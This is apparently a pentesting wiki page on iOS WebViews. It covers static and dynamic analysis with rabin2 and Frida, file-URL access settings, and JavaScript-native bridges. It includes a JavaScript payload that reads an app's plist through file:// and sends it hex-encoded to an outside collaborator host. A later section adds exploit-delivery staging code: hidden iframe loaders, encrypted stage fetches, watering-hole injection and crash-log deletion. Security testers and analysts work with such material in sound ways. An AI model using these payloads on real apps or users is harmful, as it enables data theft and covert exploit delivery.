---
title: "iOS WebViews"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/mobile-pentesting/ios-pentesting/ios-webviews.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: mobile/ios
---

## WebView types

WebViews are utilized within applications to display web content interactively. Various types of WebViews offer different functionalities and security features for iOS applications. Here’s a brief overview:[\[4\]](#references)

-
**UIWebView** , which is no longer recommended from iOS 12 onwards due to its lack of support for disabling**JavaScript** , making it susceptible to script injection and**Cross-Site Scripting (XSS)** attacks.
-
**WKWebView** is the preferred option for incorporating web content into apps, offering enhanced control over the content and security features.**JavaScript** is enabled by default, but it can be disabled if necessary. It also supports features to prevent JavaScript from automatically opening windows and ensures that all content is loaded securely. Additionally,**WKWebView** ’s architecture minimizes the risk of memory corruption affecting the main app process.
-
**SFSafariViewController** offers a standardized web browsing experience within apps, recognizable by its specific layout including a read-only address field, share and navigation buttons, and a direct link to open content in Safari. Unlike**WKWebView** ,**JavaScript** cannot be disabled in**SFSafariViewController** , which also shares cookies and data with Safari, maintaining user privacy from the app. It must be displayed prominently according to App Store guidelines.

```
// Example of disabling JavaScript in WKWebView:
WKPreferences *preferences = [[WKPreferences alloc] init];
preferences.javaScriptEnabled = NO;
WKWebViewConfiguration *config = [[WKWebViewConfiguration alloc] init];
config.preferences = preferences;
WKWebView *webView = [[WKWebView alloc] initWithFrame:CGRectZero configuration:config];
```
## WebViews Configuration Exploration Summary

### **Static Analysis Overview**

**Static Analysis Overview**

In the process of examining **WebViews** configurations, two primary types are focused on: **UIWebView** and **WKWebView**. For identifying these WebViews within a binary, commands are utilized, searching for specific class references and initialization methods.[\[3\]](#references)[\[4\]](#references)

- **UIWebView Identification**

```
$ rabin2 -zz ./WheresMyBrowser | egrep "UIWebView$"
```
This command helps in locating instances of **UIWebView** by searching for text strings related to it in the binary.

- **WKWebView Identification**

```
$ rabin2 -zz ./WheresMyBrowser | egrep "WKWebView$"
```
Similarly, for **WKWebView**, this command searches the binary for text strings indicative of its usage.

Furthermore, to find how a **WKWebView** is initialized, the following command is executed, targeting the method signature related to its initialization:

```
$ rabin2 -zzq ./WheresMyBrowser | egrep "WKWebView.*frame"
```
#### **JavaScript Configuration Verification**

**JavaScript Configuration Verification**

For **WKWebView**, it’s highlighted that disabling JavaScript is a best practice unless required. The compiled binary is searched to confirm that the `javaScriptEnabled` property is set to `false`, ensuring that JavaScript is disabled:

```
$ rabin2 -zz ./WheresMyBrowser | grep -i "javascriptenabled"
```
#### **Only Secure Content Verification**

**Only Secure Content Verification**

**WKWebView** offers the capability to identify mixed content issues, contrasting with **UIWebView**. This is checked using the `hasOnlySecureContent` property to ensure all page resources are loaded through secure connections. The search in the compiled binary is performed as follows:

```
$ rabin2 -zz ./WheresMyBrowser | grep -i "hasonlysecurecontent"
```
### **Dynamic Analysis Insights**

**Dynamic Analysis Insights**

Dynamic analysis involves inspecting the heap for WebView instances and their properties. A script named `webviews_inspector.js` is used for this purpose, targeting `UIWebView`, `WKWebView`, and `SFSafariViewController` instances. It logs information about found instances, including URLs and settings related to JavaScript and secure content.[\[4\]](#references)

Heap inspection can be conducted using `ObjC.choose()` to identify WebView instances and check the `javaScriptEnabled` and `hasOnlySecureContent` properties.

```
ObjC.choose(ObjC.classes["UIWebView"], {
  onMatch: function (ui) {
    console.log("onMatch: ", ui)
    console.log("URL: ", ui.request().toString())
  },
  onComplete: function () {
    console.log("done for UIWebView!")
  },
})
ObjC.choose(ObjC.classes["WKWebView"], {
  onMatch: function (wk) {
    console.log("onMatch: ", wk)
    console.log("URL: ", wk.URL().toString())
  },
  onComplete: function () {
    console.log("done for WKWebView!")
  },
})
ObjC.choose(ObjC.classes["SFSafariViewController"], {
  onMatch: function (sf) {
    console.log("onMatch: ", sf)
  },
  onComplete: function () {
    console.log("done for SFSafariViewController!")
  },
})
ObjC.choose(ObjC.classes["WKWebView"], {
  onMatch: function (wk) {
    console.log("onMatch: ", wk)
    console.log(
      "javaScriptEnabled:",
      wk.configuration().preferences().javaScriptEnabled()
    )
  },
})
ObjC.choose(ObjC.classes["WKWebView"], {
  onMatch: function (wk) {
    console.log("onMatch: ", wk)
    console.log("hasOnlySecureContent: ", wk.hasOnlySecureContent().toString())
  },
})
```
The script is executed with:

```
frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js
```
**Key outcomes:**

- Instances of WebViews are successfully located and inspected.
- JavaScript enablement and secure content settings are verified.

This summary encapsulates the critical steps and commands involved in analyzing WebView configurations through static and dynamic approaches, focusing on security features like JavaScript enablement and mixed content detection.

## WebView Protocol Handling

Handling content in WebViews is a critical aspect, especially when dealing with various protocols such as `http(s)://`, `file://`, and `tel://`. These protocols enable the loading of both remote and local content within apps. It is emphasized that when loading local content, precautions must be taken to prevent users from influencing the file’s name or path and from editing the content itself.[\[2\]](#references)[\[4\]](#references)

**WebViews** offer different methods for content loading. For **UIWebView**, now deprecated, methods like `loadHTMLString:baseURL:` and `loadData:MIMEType:textEncodingName:baseURL:` are used. **WKWebView**, on the other hand, employs `loadHTMLString:baseURL:`, `loadData:MIMEType:textEncodingName:baseURL:`, and `loadRequest:` for web content. Methods such as `pathForResource:ofType:`, `URLForResource:withExtension:`, and `init(contentsOf:encoding:)` are typically utilized for loading local files. The method `loadFileURL:allowingReadAccessToURL:` is particularly notable for its ability to load a specific URL or directory into the WebView, potentially exposing sensitive data if a directory is specified.

To find these methods in the source code or compiled binary, commands like the following can be used:

```
$ rabin2 -zz ./WheresMyBrowser | grep -i "loadHTMLString"
231 0x0002df6c 24 (4.__TEXT.__objc_methname) ascii loadHTMLString:baseURL:
```
Regarding **file access**, UIWebView allows it universally, whereas WKWebView introduces `allowFileAccessFromFileURLs` and `allowUniversalAccessFromFileURLs` settings for managing access from file URLs, with both being false by default.

A Frida script example is provided to inspect **WKWebView** configurations for security settings:

```
ObjC.choose(ObjC.classes['WKWebView'], {
  onMatch: function (wk) {
    console.log('onMatch: ', wk);
    console.log('URL: ', wk.URL().toString());
    console.log('javaScriptEnabled: ', wk.configuration().preferences().javaScriptEnabled());
    console.log('allowFileAccessFromFileURLs: ',
            wk.configuration().preferences().valueForKey_('allowFileAccessFromFileURLs').toString());
    console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
    console.log('allowUniversalAccessFromFileURLs: ',
            wk.configuration().valueForKey_('allowUniversalAccessFromFileURLs').toString());
  },
  onComplete: function () {
    console.log('done for WKWebView!');
  }
});
```
Lastly, an example of a JavaScript payload aimed at exfiltrating local files demonstrates the potential security risk associated with improperly configured WebViews. This payload encodes file contents into hex format before transmitting them to a server, highlighting the importance of stringent security measures in WebView implementations.

```
String.prototype.hexEncode = function () {
  var hex, i
  var result = ""
  for (i = 0; i < this.length; i++) {
    hex = this.charCodeAt(i).toString(16)
    result += ("000" + hex).slice(-4)
  }
  return result
}
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
  if (xhr.readyState == XMLHttpRequest.DONE) {
    var xhr2 = new XMLHttpRequest()
    xhr2.open(
      "GET",
      "http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/" +
        xhr.responseText.hexEncode(),
      true
    )
    xhr2.send(null)
  }
}
xhr.open(
  "GET",
  "file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist",
  true
)
xhr.send(null)
```
## Native methods exposed through WebViews

Since iOS 7, Apple has provided APIs for **communication between JavaScript in a WebView and native** Swift or Objective-C objects. This integration is primarily facilitated through two methods:[\[4\]](#references)

- **JSContext** : A JavaScript function is automatically created when a Swift or Objective-C block is linked to an identifier within a`JSContext` . This allows for seamless integration and communication between JavaScript and native code.
- **JSExport Protocol** : By inheriting the`JSExport` protocol, native properties, instance methods, and class methods can be exposed to JavaScript. This means any changes made in the JavaScript environment are mirrored in the native environment, and vice versa. However, it’s essential to ensure that sensitive data is not exposed inadvertently through this method.

### Accessing `JSContext` in Objective-C

`JSContext` in Objective-C
In Objective-C, the `JSContext` for a `UIWebView` can be retrieved with the following line of code:

```
[webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"]
```
### Communication with `WKWebView`

`WKWebView`
For `WKWebView`, direct access to `JSContext` is not available. Instead, message passing uses the `postMessage` function for JavaScript-to-native communication. Handlers for these messages are set up as follows:

```
func enableJavaScriptBridge(_ enabled: Bool) {
    options_dict["javaScriptBridge"]?.value = enabled
    let userContentController = wkWebViewConfiguration.userContentController
    userContentController.removeScriptMessageHandler(forName: "javaScriptBridge")
    if enabled {
        let javaScriptBridgeMessageHandler = JavaScriptBridgeMessageHandler()
        userContentController.add(javaScriptBridgeMessageHandler, name: "javaScriptBridge")
    }
}
```
### Interaction and Testing

JavaScript can interact with the native layer by defining a script message handler. This allows for operations like invoking native functions from a webpage:

```
function invokeNativeOperation() {
  value1 = document.getElementById("value1").value
  value2 = document.getElementById("value2").value
  window.webkit.messageHandlers.javaScriptBridge.postMessage([
    "multiplyNumbers",
    value1,
    value2,
  ])
}
// Alternative method for calling exposed JavaScript functions
document.location = "javascriptbridge://addNumbers/" + 1 + "/" + 2
```
To capture and manipulate the result of a native function call, one can override the callback function within the HTML:

```
<html>
  <script>
    document.location = "javascriptbridge://getSecret"
    function javascriptBridgeCallBack(name, result) {
      alert(result)
    }
  </script>
</html>
```
The native side handles the JavaScript call as shown in the `JavaScriptBridgeMessageHandler` class, where the result of operations like multiplying numbers is processed and sent back to JavaScript for display or further manipulation:

```
class JavaScriptBridgeMessageHandler: NSObject, WKScriptMessageHandler {
    // Handling "multiplyNumbers" operation
    case "multiplyNumbers":
        let arg1 = Double(messageArray[1])!
        let arg2 = Double(messageArray[2])!
        result = String(arg1 * arg2)
    // Callback to JavaScript
    let javaScriptCallBack = "javascriptBridgeCallBack('\(functionFromJS)','\(result)')"
    message.webView?.evaluateJavaScript(javaScriptCallBack, completionHandler: nil)
}
```
### Modern `WKWebView` bridge triage

`WKWebView` bridge triage
On current iOS apps, the most interesting bridge entry points are usually `addScriptMessageHandler:name:`, `addScriptMessageHandler:contentWorld:name:`, and `addScriptMessageHandlerWithReply:contentWorld:name:`. Any JavaScript that reaches the page can call `window.webkit.messageHandlers.<name>.postMessage(...)`, so an XSS, an attacker-controlled page, or an untrusted iframe becomes a native-code pivot if the handler exposes sensitive actions. During review, check whether privileged handlers validate `message.frameInfo.securityOrigin` (and ideally reject unexpected subframes) before touching tokens, filesystem paths, deeplink targets, or app state.[\[6\]](#references)

Useful source/binary triage patterns:

```
# Source code / decompiled Swift/ObjC
rg -n 'addScriptMessageHandler|addScriptMessageHandlerWithReply|WKContentWorld|evaluateJavaScript\(|callAsyncJavaScript\(' .
# Compiled app
rabin2 -zzq Payload/App.app/AppBinary | rg 'addScriptMessageHandler|WKScriptMessageHandlerWithReply|WKContentWorld|evaluateJavaScript|callAsyncJavaScript|messageHandlers'
```
A small Frida hook is usually enough to enumerate bridge names at runtime and immediately spot whether the app is using the legacy global registration or a specific `WKContentWorld`:[\[6\]](#references)

```
Interceptor.attach(ObjC.classes.WKUserContentController['- addScriptMessageHandler:name:'].implementation, {
  onEnter(args) { console.log('[bridge] legacy name=' + ObjC.Object(args[3]).toString()) }
})
Interceptor.attach(ObjC.classes.WKUserContentController['- addScriptMessageHandler:contentWorld:name:'].implementation, {
  onEnter(args) {
    console.log('[bridge] world=' + ObjC.Object(args[3]).toString() + ' name=' + ObjC.Object(args[4]).toString())
  }
})
```
## iOS Web Exploit Delivery & Staging Tradecraft

The following patterns have been observed in real-world iOS Safari/WebKit exploit delivery chains and are useful for analysis, detection, and controlled emulation.[\[1\]](#references)

### Multi-stage loader via hidden iframes

A common staging pattern is to gate execution to avoid reinfection or analysis and then inject a hidden/off-screen `iframe` for the next stage:

```
<script>
if (!sessionStorage.getItem('uid') && isTouchScreen) {
  sessionStorage.setItem('uid', '1');
  const frame = document.createElement('iframe');
  frame.src = 'frame.html?' + Math.random();
  frame.style.height = 0;
  frame.style.width = 0;
  frame.style.border = 'none';
  document.body.appendChild(frame);
} else {
  top.location.href = 'red';
}
</script>
```
A minimal staging page can inject the main loader via `document.write()`:

```
<script>
  document.write('<script defer="defer" src="rce_loader.js"><\/script>');
</script>
```
Loader stages frequently pull subsequent JavaScript synchronously:

```
function getJS(fname) {
  const xhr = new XMLHttpRequest();
  xhr.open('GET', fname, false);
  xhr.send(null);
  return xhr.responseText;
}
```
Later stages can be executed in a worker-like context by building a Blob URL:

```
const workerCode = getJS('rce_worker_18.4.js');
const workerBlob = new Blob([workerCode], { type: 'text/javascript' });
const workerBlobUrl = URL.createObjectURL(workerBlob);
```
### Forcing Safari to hit the WebKit/JSC surface

If a victim opens a lure in another browser, a protocol handler can force Safari:

```
if (typeof browser === 'undefined' && isIphone()) {
  location.href = 'x-safari-https://example.com/<redacted>';
}
```
### Encrypted stage fetch (ECDH + AES)

Some loaders encrypt exploit stages in transit. A minimal client flow is: generate an ephemeral ECDH keypair, POST the base64 public key, receive encrypted blobs, derive an AES key, decrypt, then decode to JavaScript:

```
const kp = generateKeyPair();
const pubPem = exportPublicKeyAsPem(kp.publicKey);
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://<redacted>/stage?'+Date.now(), false);
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send(JSON.stringify({ a: btoa(pubPem) }));
const { a, b } = JSON.parse(xhr.responseText);
const aesKey = deriveAesKey(kp.privateKey, b64toUint8Array(b));
const js = new TextDecoder().decode(decryptData(b64toUint8Array(a), aesKey));
```
### Watering-hole injection pattern

Compromised sites can load a remote script that builds an off-screen `iframe` and constrains it with a sandbox while still allowing script execution:

```
<script async src="https://static.example.net/widgets.js?token"></script>
```
```
const iframe = document.createElement('iframe');
iframe.src = 'https://static.example.net/assets/index.html';
iframe.style.width = '1px';
iframe.style.height = '1px';
iframe.style.position = 'absolute';
iframe.style.left = '-9999px';
iframe.style.opacity = '0.01';
iframe.setAttribute('sandbox', 'allow-scripts allow-same-origin');
document.body.appendChild(iframe);
```
### Post-exploitation anti-forensics indicators (JS implants)

- Temporary staging under `/tmp/<uuid>.<digits>/` with subfolders like`STORAGE` ,`DATA` , and`TMP` .
- Deletion of crash logs in `/var/mobile/Library/Logs/CrashReporter/` (often filtered by WebKit/SpringBoard substrings).
- Recursive deletion of `/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.osanalytics/DiagnosticReports/` .

## Debugging iOS WebViews

(Tutorial based on the one from [https://blog.vuplex.com/debugging-webviews](https://blog.vuplex.com/debugging-webviews))[\[5\]](#references)

To effectively debug web content within iOS webviews, a specific setup involving Safari’s developer tools is required due to the fact that messages sent to `console.log()` are not displayed in Xcode logs. Here’s a simplified guide, emphasizing key steps and requirements:[\[5\]](#references)

-
**Preparation on iOS Device** : The Safari Web Inspector needs to be activated on your iOS device. This is done by going to**Settings > Safari > Advanced** , and enabling the*Web Inspector* .
-
**Preparation on macOS Device** : On your macOS development machine, you must enable developer tools within Safari. Launch Safari, access**Safari > Preferences > Advanced** , and select the option to*Show Develop menu* .
-
**Connection and Debugging** : After connecting your iOS device to your macOS computer and launching your application, use Safari on your macOS device to select the webview you want to debug. Navigate to*Develop* in Safari’s menu bar, hover over your iOS device’s name to see a list of webview instances, and select the instance you wish to inspect. A new Safari Web Inspector window will open for this purpose.

On modern systems, the second limitation is no longer absolute: since iOS/iPadOS **16.4**, a release build can expose its `WKWebView` or `JSContext` to Safari by setting `isInspectable = true`, so some App Store apps will now appear in the **Develop** menu if the developer opted in.[\[7\]](#references)

```
if (ObjC.classes.WKWebView && ObjC.classes.WKWebView['- setInspectable:']) {
  ObjC.choose(ObjC.classes.WKWebView, {
    onMatch: function (wk) { wk.setInspectable_(1) },
    onComplete: function () {}
  })
}
```
However, be mindful of the limitations:

- Debugging with this method still requires a macOS device since it relies on Safari.
- If the target app does **not** opt into`isInspectable` , Safari will usually not list the WebView even though the device-side Web Inspector toggle is enabled.<sup>[\[7\]](#references)</sup>

## References
